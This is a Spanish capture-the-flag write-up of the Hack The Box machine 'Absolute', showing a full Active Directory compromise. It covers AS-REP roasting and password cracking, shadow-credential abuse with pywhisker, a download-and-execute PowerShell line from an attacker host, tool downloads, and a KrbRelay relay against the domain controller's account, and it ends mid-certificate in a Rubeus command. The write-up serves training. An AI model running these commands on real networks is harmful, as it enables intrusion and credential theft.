---
layout: post
title: Absolute
date: 2023-05-25
description:
img:
fig-caption:
tags: [OSCP, OSED]
---
___

<center><img src="/writeups/assets/img/Absolute-htb/Absolute_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración por SMB

* Análisis de metadatos

* Validación de Usuarios por Kerberos

* ASPRoasting Attack - Obtención de TGT

* Enumeración por LDAP

* Information Disclosure

* Análisis de binario Winx86

* Análisis de tráfico con Wireshark - Leak de credenciales

* Enumeración con BloodHound a través de Kerberos

* Abuso del Privilegio WriteOwner

* Abuso del Privilegio GenericWrite

* Modificación de atributos a usuario - Remotamente, pywhisker

* Acceso por WINRM y Kerberos

* Abuso del Privilegio WriteDACL

* Command Bypass - Uso de RunasCS (Escalada de Privilegios)

* Kerberos Relaying - Generación de Certificado (Escalada de Privilegios)

* Obtención de hash NT - Uso de Rubeus (Escalada de Privilegios)

* PassTheHash (Escalada de Privilegios)

***

# Video

<iframe width="420" height="315" src="https://www.youtube.com/embed/R8odPmVD3Bc" frameborder="0" allowfullscreen></iframe>

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.181 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 16:28 GMT
Nmap scan report for 10.10.11.181
Host is up (0.046s latency).
Not shown: 65507 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49695/tcp open  unknown
49703/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49685,49686,49695,49703 10.10.11.181 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 16:29 GMT
Nmap scan report for DC.ABSOLUTE.HTB (10.10.11.181)
Host is up (0.082s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Absolute
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-02 23:29:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-02-02T23:30:16+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-02T23:30:16+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-02-02T23:30:16+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-02-02T23:30:16+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-02T23:30:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.66 seconds
```

## Puerto 445 (SMB)

Con crackmapexec aplico un escaneo para ver la versión, dominio y hostname

```null
crackmapexec smb 10.10.11.181
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
```

Pruebo a enumerar los recursos compartidos como usuario de invitado, pero no tengo acceso

```null
smbmap -H 10.10.11.181 -u 'null'
[!] Authentication error on 10.10.11.181
```

## Puerto 80 (HTTP)

Con whatweb, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.11.181
http://10.10.11.181 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.181], JQuery[3.3.1], Microsoft-IIS[10.0], Script, Title[Absolute]
```

La página principal se ve así:

<img src="/writeups/assets/img/Absolute-htb/1.png" alt="">

En el código fuente se puede ver que está incluyendo 6 imágenes

<img src="/writeups/assets/img/Absolute-htb/2.png" alt="">

Las descargo y analizo sus metadatos

```null
for i in $(seq 1 6); do wget http://10.10.11.181/images/hero_$i.jpg &>/dev/null; done
```

Para ello, utilizo exiftool y filtro por los campos Creator y Author

```null
exiftool *.jpg | grep -E "Author|Creator" | grep -vE "Tool|Profile" | awk '{print $3 " " $4}'
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith
```

Para validarlos con Kerberos, voy a suponer que se está empleando la estructura inicial más punto y apellido. Añado el dominio absolute.htb y dc.absolute.htb al /etc/hosts

```null
kerbrute userenum -d absolute.htb --dc dc.absolute.htb users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/02/23 - Ronnie Flathers @ropnop

2023/02/02 16:45:21 >  Using KDC(s):
2023/02/02 16:45:21 >  	dc.absolute.htb:88

2023/02/02 16:45:28 >  [+] VALID USERNAME:	M.Chaffrey@absolute.htb
2023/02/02 16:45:28 >  [+] VALID USERNAME:	J.Roberts@absolute.htb
2023/02/02 16:45:28 >  [+] D.Klay has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$D.Klay@ABSOLUTE.HTB:ca4043340e5e17790588cb93da0d1a56$8668c1e2b88917c9bc3f18406d3b5cee88de7613cf0e12748c4614d9035f5c0b9d94e36cbfa3fc9df56c03157040131b01243f6c8997f10019006c35bdc598602a52dad7f16b0bbdf978839007a894250c5d12e8581402ac3c7bfa3a6780f8c3a406a6bc913c9b29d9d497a4eb718194bbdaee49339fb6a4cf71c83fc069f050ba5be52f4f8a3bd5abfe33a24bf14d8f2e366bcd1943ad71bb9f45597c591ba3482fb4ad5fc95212e3d3ff032f060fd0907ce918bcb5c7667e65e1bf99cec4ec982330924642acacf86652921ea01a3bf1946c2b708d8c9986e77d74e74985fb4305bd1e49dd9f069c19fba3e56dbd210c8a4ee5b569ee249b24340449065e3a
2023/02/02 16:45:28 >  [+] VALID USERNAME:	D.Klay@absolute.htb
2023/02/02 16:45:28 >  [+] VALID USERNAME:	J.Robinson@absolute.htb
2023/02/02 16:45:28 >  [+] VALID USERNAME:	N.Smith@absolute.htb
2023/02/02 16:45:28 >  [+] VALID USERNAME:	S.Osvald@absolute.htb
2023/02/02 16:45:28 >  Done! Tested 6 usernames (6 valid) in 6.120 seconds
```

El usuario d.klay es ASP-RepRoasteable, ya que no requiere de autenticación previa de Kerberos. Puedo tratar de romper el hash para obtener una contraseña

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Darkmoonsky248girl ($krb5asrep$23$D.Klay@ABSOLUTE.HTB)     
1g 0:00:00:13 DONE (2023-02-02 16:50) 0.07358g/s 826961p/s 826961c/s 826961C/s DarrenCahppell..Danuelle
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

La valido por SMB

```null
crackmapexec smb 10.10.11.181 -u 'd.klay' -p 'Darkmoonsky248girl'
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
```

Pero me pone que está restringida. Suponiendo que la autenticación NTLM está deshabilitada, solicito su TGT y lo exporto a la variable de entorno KRB5CCNAME

```null
getTGT.py absolute.htb/d.klay:Darkmoonsky248girl
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in d.klay.ccache

export KRB5CCNAME=d.klay.ccache
```

Son válidas, pero no pertenece al grupo Remote Management Users, por o que no me puedo conectar por winrm

```null
crackmapexec smb 10.10.11.181 --use-kcache
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [+] absolute.htb\ from ccache 
```

Sigo sin tener acceso a recursos compartidos

```null
impacket-smbclient d.klay@absolute.htb -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)
```

Procedo a enumerar el LDAP

```null
crackmapexec ldap 10.10.11.181 --use-kcache --users
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.181    389    DC               [+] absolute.htb\D.Klay from ccache 
LDAP        10.10.11.181    389    DC               [*] Total of records returned 20
LDAP        10.10.11.181    389    DC               Administrator                  Built-in account for administering the computer/domain
LDAP        10.10.11.181    389    DC               Guest                          Built-in account for guest access to the computer/domain
LDAP        10.10.11.181    389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.10.11.181    389    DC               J.Roberts                      
LDAP        10.10.11.181    389    DC               M.Chaffrey                     
LDAP        10.10.11.181    389    DC               D.Klay                         
LDAP        10.10.11.181    389    DC               s.osvald                       
LDAP        10.10.11.181    389    DC               j.robinson                     
LDAP        10.10.11.181    389    DC               n.smith                        
LDAP        10.10.11.181    389    DC               m.lovegod                      
LDAP        10.10.11.181    389    DC               l.moore                        
LDAP        10.10.11.181    389    DC               c.colt                         
LDAP        10.10.11.181    389    DC               s.johnson                      
LDAP        10.10.11.181    389    DC               d.lemm                         
LDAP        10.10.11.181    389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.10.11.181    389    DC               svc_audit                      
LDAP        10.10.11.181    389    DC               winrm_user                     Used to perform simple network tasks
```

El usuario svc_smb tiene su contraseña en la descripción. Solicito un TGT para este usuario

```null
getTGT.py absolute.htb/svc_smb:AbsoluteSMBService123!
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in svc_smb.ccache
export KRB5CCNAME=svc_smb.ccache
```

Ahora ya puedo listar recursos compartidos

```null
impacket-smbclient svc_smb@dc.absolute.htb -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL
# use Shared
# ls
drw-rw-rw-          0  Thu Sep  1 17:02:23 2022 .
drw-rw-rw-          0  Thu Sep  1 17:02:23 2022 ..
-rw-rw-rw-         72  Thu Sep  1 17:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Thu Sep  1 17:02:23 2022 test.exe
# get test.exe
# get compiler.sh
# 
```

Transifero el binario a una máquina Windows para analizarlo a fondo

Lo abro con DNSpy pero no veo nada de interés

<img src="/writeups/assets/img/Absolute-htb/3.png" alt="">

Al debbugearlo con x64dbg, me percato de que se está haciendo una llamada al RPC

<img src="/writeups/assets/img/Absolute-htb/4.png" alt="">

Como la máquina Windows no tiene conectividad con el DC, me descargo un cliente de openvpn para conectarme, volver a ejecutar el programa y con wireshark interceptar el gráfico por la interfaz tun0. Añado al archivo hosts de windows el dominio absolute.htb y el subdominio dc.absolute.htb

Puedo llegar a interceptar credenciales en texto claro

<img src="/writeups/assets/img/Absolute-htb/5.png" alt="">

Solicito un nuevo TGT

```null
getTGT.py absolute.htb/m.lovegod:AbsoluteLDAP2022!
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in m.lovegod.ccache

export KRB5CCNAME=m.lovegod.ccache
```

Para poder escalar privilegios hago una enumeración con bloodhound-python, pero la versión que viene con Kali no es del todo funcional a través de Kerberos, por lo que busco en Github un repositorio de alguien que lo ha optimizado

```null
git clone https://github.com/jazzpizazz/BloodHound.py-Kerberos
cd BloodHound.py-Kerberos
python3 setup.py install

python3 bloodhound.py -u m.lovegod -k -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 --dns-tcp --zip -no-pass -c ALL
```

Me abro bloodhound e importo el ZIP

<img src="/writeups/assets/img/Absolute-htb/6.png" alt="">

El usuario m.lovegod, miembro del grupo Networkers, tiene WriteOwner sobre el grupo Network Audit y este GenericWrite sobre el usuario winrm_user. Para poder abusar de este privilegio, primero tengo que agregarme al grupo Network Audit y como estoy en Networkers no debería tener ningún problema.

<img src="/writeups/assets/img/Absolute-htb/7.png" alt="">

En la máquina Windows, me importo el script PowerView.ps1 de PowerSploit y me instalo los complentos RSAT desde la configuración de aplicaciones

<img src="/writeups/assets/img/Absolute-htb/8.png" alt="">

Borro los dominios del hosts de Windows que había añadido antes, para configurar el DNS desde la configuración de la propia interfaz

<img src="/writeups/assets/img/Absolute-htb/9.png" alt="">

Sincronizo el reloj con el del DC

<img src="/writeups/assets/img/Absolute-htb/10.png" alt="">

Me agrego al grupo Network Audit

<img src="/writeups/assets/img/Absolute-htb/11.png" alt="">

Me descargo Pywhikser en la máquina linux para poder modificarlo los atributos a winrm_user y poder agregarlo al grupo Remote Management Users

```null
git clone https://github.com/ShutdownRepo/pywhisker
cd pywhisker

python3 pywhisker.py -d absolute.htb -u m.lovegod -t winrm_user -k --no-pass --action add
[*] Searching for the target account
[*] Target user found: CN=winrm_user,CN=Users,DC=absolute,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: c13c1fa6-7e69-b036-071f-c5f7e0527179
[*] Updating the msDS-KeyCredentialLink attribute of winrm_user
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: lhimxJwZ.pfx
[*] Must be used with password: UL96QiwreB82tfy5DIw1
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Esto crea un certificado que puedo tratar de descifrar para solictar un TGT de winrm_user. Me descargo la utilidad que me permite hacer esa operatoria y la ejecuto.

```null
wget https://raw.githubusercontent.com/dirkjanm/PKINITtools/master/gettgtpkinit.py

python3 gettgtpkinit.py absolute.htb/winrm_user -cert-pfx lhimxJwZ.pfx -pfx-pass UL96QiwreB82tfy5DIw1 winrm_user.ccache
2023-02-03 01:41:24,728 minikerberos INFO     Loading certificate and key from file
2023-02-03 01:41:24,749 minikerberos INFO     Requesting TGT
2023-02-03 01:41:46,507 minikerberos INFO     AS-REP encryption key (you might need this later):
2023-02-03 01:41:46,507 minikerberos INFO     b2a144dc92c2aa96bab2dabd3bb78a7265db706c66a44bc6d3aefb293f97d5f5
2023-02-03 01:41:46,512 minikerberos INFO     Saved TGT to file
```

Exporto la variable de entorno KRB5CCNAME a este TGT

```null
export KRB5CCNAME=winrm_user.ccache
```

Para que no entre en conflicto la conexión por evil-winrm, el archivo de configuración /etc/krb5.conf debe valer lo siguiente

```null
catr /etc/krb5.conf
[libdefaults]
        default_realm = ABSOLUTE.HTB

[realms]
        ABSOLUTE.HTB = {
                kdc = DC.ABSOLUTE.HTB
                admin_server = ABSOLUTE.HTB
        }

```

Es importante que el reino predeterminado de versión 5 de kerberos, así como el kdc estén en mayúsculas, en caso contrario no va a resolver y recomendable en el /etc/hosts apuntar primero al kdc

Gano acceso al sistema

```null
evil-winrm -i DC.ABSOLUTE.HTB -r ABSOLUTE.HTB

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
```

Me cambio rápidamente a una ConPtyShell para evitar estar conectado por Kerberos y tener problemas con el reloj

Ejecuto el SharpHound en la máquina víctima para volver a efectuar reconocimiento por Bloodhound

```null
PS C:\Temp> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/SharpHound.ps1')
PS C:\Temp> .\SharpHound.exe -c All
```

# Escalada

Creo unas PSCredentials para poder ejecutar comandos como m.lovegod (estoy como winrm_user)

```null
PS C:\Temp> $Pass = ConvertTo-SecureString 'AbsoluteLDAP2022!' -AsPlainText -Force 
PS C:\Temp> $cred = New-Object System.Management.Automation.PSCredential('absolute.htb\m.lovegod', $pass) 
```

No tengo permisos para ejecutar comandos con ScriptBlocks

```null
PS C:\Temp> Invoke-Command -ComputerName localhost -Credential $Cred -ScriptBlock { whoami } 
[localhost] Connecting to remote server localhost failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic. 
    + CategoryInfo          : OpenError: (localhost:String) [], PSRemotingTransportException 
    + FullyQualifiedErrorId : AccessDenied,PSSessionStateBroken
```

Otra manera es utilizando RunasCS.exe, en el repositorio de Github está el proyecto de Visual Studio, hay que compilarlo y subirlo a la máquina víctima. Para crear una nueva msDS-KeyCredentialLink puedo utilizar KrbRelay.exe, que permite utilizar la autenticación NTLM del Account System para interceptar la petición, de manera que si el LDAP no está firmado es posible cambiar la shadow credential del Account System para obtener su hash NTLM y poder dumpear el NTDS-

```null
PS C:\Temp> iwr -uri http://10.10.14.7/RunasCS.exe -o RunasCS.exe
PS C:\Temp> iwr -uri http://10.10.14.7/KrbRelay.exe -o KrbRelay.exe
PS C:\Temp> iwr -uri http://10.10.14.7/Rubeus.exe -o Rubeus.exe
```

Verifico que puedo ejecutar comandos como m.lovegod

```null
PS C:\Temp> .\RunasCS.exe mlovegod AbsoluteLDAP2022! -d absolute.htb -l 9 whoami
absolute\winrm_user
```

Hay que proporcionarle obligatoriamente el CLSID que corresponde al TrustedInstaller para Windows 10 Enterprise. Haz click [aquí](https://ohpe.it/juicy-potato/CLSID/) para ver la lista completa

```null
PS C:\Temp> .\RunasCS.exe mlovegod AbsoluteLDAP2022! -d absolute.htb -l 9 "C:\Temp\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid {752073A1-23F2-4396-85F0-8FDB879ED0ED} -shadowcred"
[*] Relaying context: absolute.htb\DC$ 
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\Temp\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAADmMsUyaOufZWjtmLbMCwxEApAAAKAK//8X2dK6UtZ/HSIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 752073a1-23f2-4396-85f0-8fdb879ed0ed
[*] apReq: 608206b406092a864886f71201020201006e8206a33082069fa003020105a10302010ea20703050020000000a38204e1618204dd308204d9a003020105a10e1b0c4142534f4c5554452e485442a2223020a003020102a11930171b046c6461701b0f64
632e6162736f6c7574652e687462a382049c30820498a003020112a103020104a282048a048204863fa9d8164c368e0480fa51e9756537f236775ef01e85e4d58f185063c4b35edabdee8f6ca9ae303b6489f62bb1032825dabd9523b30c242aeb41600046f63f07d
fb7acb7ba248a2d82bdddb7586ee68cf3590ee83bf6899981cefcd1dea698b20bdcf36608dce80482b201d29f9e181cfbb2b97f07ac459f7a104ee4ba14d2205872ad899367f0b02046730c069a85ab1334aeb1f3109dbaed8ed2bce388aa86739af5c1f49a1305da
c87106fd1d7d858524ca74cd0073dde70a282da8793a5eff373588597ff5df1eea4f447966d56327c5fac4677f2ba0d8eead6eab2a27d3a25dbcca0d7bb1725cde74418a6c44bf7f1ee115836731c2076a76a92436d1f81783d49f13aef68f1aad735b5783d28b061
39fdf67842766e2b6c61da426d3e8acf7dd04c974c52892a6cfd36c6c0918b18d48dc7615e0a5efc78eac26298062e598d7683a044a4c048bd24b0a2b0fae6998a7af69c912cfef684d191af6c346ddaef13f77bd15bbf52c3b407b68f06a9c46708bd773b79b536b
55bd54b2a0a3969b9232d7877da272fa8d0cabda786612ef76029dd5ea1762a79fd1ba258255ecdc592c59c65d9151e8ef8c28ef2d5c497c71b1fd4bc8220991cc6bd9d6e8505b046b66d54f67f00c6e6dcbd02b98d852ad320a759ca6c7038b59757cdcc306479af
25e6e3adfe83af8f8aecfde7f8076ede03393b00434998a723d3f7d66e627ae33d1d82ff8faf67b4678fe1a9ee89fa847cf6d6cb3ad82cd282d97c0203bce7d666299e5460027187e48f3a3f6da91ed1ac50103c036831888a26a22f8242b00f7b989cb4f8c496041
e1ac6278a930107e273ecbde7237eed888d482b819e54b333e8bc6c5508b34e6b04b30eef13b01c77dc0ad7cb970c50245d6ac8ae41b7b1550fb5af4a419137285e1fa91b26b0c0befa2bd80a6a41a78740f181638c724ddc3b05f274cf4553e5ea226ac5cdbe9689
9a0c1c1bd7c795a10c463f9f7589b4ca933d300c0060a46444ceede87423d9f96e2e6e204ce160ef82aac39900f3b5bfc02f066a0ba2183217b4c7d4aa56b4fc92f541289cf7403eeb32464ac97f20e4b4976b74c9dc39343244055eae03576d8c68c6262714d92f8
f8241f586f8cd3bf4da6220dbad9c30fecae04654d04c5414e0e9aca9acd1e938397bebba7c62fc0f9854d5c1069952db605388dde70f705d00d8c3ad86c066f81aba7aa8bdc7a8838a6c4ee174e0172aa0264d0db52abf430cce7beecc6cc82747a469840d6a851e
d8d2d9498981302f834f1e152026409942a34a92b0a5f29754f3f939a9bb04a291628a9be0b3709d5a72f042a660f35f61030a27b4597c99a6a51a835022f95d1621c6d7a6d725cf8eba7c525039f4ba75b96650933990b6b794c6a9648769463e2382e09ef951c75
92c8ff2ae46e2c3c77bda30de3d3c79592fce1905dfbce358e87c44c7cac9e721205931b5e3c98fe264a000aa1fef18d3fc18faec63d5b1496d8c6d8f9c7cd1fa3b557528800f113a6d17b0ba7df443d7c9c2acc27a760e8e845205fbcd5b6241fca09f45957081e5
5d4e20b2cdf684c69222222695f3edb14cb26e561c07ba87e7466ce396d61b1f1e01eb0f1ce8805b2da4ae14dba4fd259a48201a33082019fa003020112a2820196048201920de4e27f47d7922e21e5ec1d22da03cbea63e318d2186dfe089841284c9dc032ab5cb4
32d19ecf18d75cdccba655a1c981aaae72997447ce1a86e89e97b77c9e340680baea904d8ae1780783a3713e19cc75a8ecbc331486c12c4e862708af1afb71d629dcdd0998bbf5347c8f7da2dbb9a51671394d1039cdd36c461c9e82c2db60427dcf260061f7ca3b7
eb131068027f682f21e5a98f140a3ba67bcbd1910c1c0a25f2fcdb5e69aa60478ad0c0f35a4dea4723eecde7ae02444969e5a6ae11daa84ad1e5742a9a90b5b9cb27713b6b514632a03376848c329687e23518342c48898b0d72b6e21bbee6a276126fd9af860ce97
85b40739f1cd525bb8999e6cf479186a78cdbf4ecef3c3b28a060360c35d295c208ac71fe5c1ce6b5306e599b565f9cf645dbcea210560a351ae339ad8d68767272d074f4dc4cbb4f6a25e71b0d93af6a7d3c812671b94dfd1f1523b6d8a1f9b9f58c0bd9e8a9da9b
0bdd0f773b025bacfcb68fc401b5dae432971e87813aee04096a9324d3d6e8859237fa793f25ef6e656735870448272867a55d1c4c7
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046efe58cb96c207d483ce3cbf1fd970401925bb81c41126c3c6c82e62cd899d64f9f7119898024f5dbf31977ef4719c3f05371c26b8012bf9669e78e407a9c5dd4d520015e1cab
e056eb3cf5db6581778d0f6b6e0da2f4bee64be08908593baa291ccdd005555fd580487bfa7dd9e25
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a2440442158082050034689ac66e0898b429562f730f470b831edee70c2ed0d76c4d1d5c8e9e75492ad6b6dd398e6b6b9d2fefdea93f7370a043ab92f6a7f6c4edb69bb67237
[*] bind: 0
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established
[*] ldap_modify: LDAP_SUCCESS
Rubeus.exe asktgt /user:DC$ /certificate:MIIJsAIBAzCCCWwGCSqGSIb3DQEHAaCCCV0EgglZMIIJVTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAg3eD/PE7qZ2AICB9AEggTY15IVzFrh
q9Ws9NFvles3sWa9/ApDZF1Xsb5yFOjrsiGAbK7Me/S+77HFGZlF8MoIbpUR7JXfCj/wAZWAZzGBTkXu/otjeyFX39XiTBJq67NGJBBMXynffjvVCRZvpH8N0H2qJCUAsXcPvGDjrIklB4YfoUWorVS4UoWpGTQkpwgd0ACyPa/zS3UvOngwqJwMmdm2O4e/f9LQcY+EILkhxUXEL
z79Xq7ql3t2mvmAEQ82ZxiM9hKlw90SX0sic2vWrWof0SgDIjzBLAgkYF3FTvzFtEHCpo0U25gjHwflHratxuzl2q0mftD1eZTGdnBamXy+j7iJXgu0PKlfxIuPGaIYmu/n3X69TAD+LjEphjZs9He5XrvzUBwutjLPnOauHbeLlsOoEzBky+JqnJr29cRMbb8AN5NvtwpWjbzb0c
xkbRXj5zc5qdbIU1Il3IFC5nJTeU8p0u9xScIz2GFYNf3yzRbK6euCWtKf5Q45tZlCFyN4r/MItSLUTCBQ1PuFsfZ84ONggz/7AfyaRSTRaC/o8MXSksEftv4xBZ1isxym6jWWTCJZ/TuznPxqwU4TmOhHt1VDzUspL6kAIdT4ZDTpOkxERnR/YMHhQ1iP6gxEHUNhtUMbvAljiAf
nzWGBzWwiqxVf321tLjOENFb44jc+OAxbXLxMaEmv64RMJkuFfKLtium2XNy1mFV+DtGftsq4gt1qflMhHauRfPunZ/7rfX9f6MITTO+V+XxmLx3mtyW3RgKthMJmJS2evN24JkfkvlwFU0fAqVCgK9I8G1YsRsMNIAQ3YTuo76HAlQrA3iOdlOG2tJ263Jt1ZtXCRFI++NGy95cn
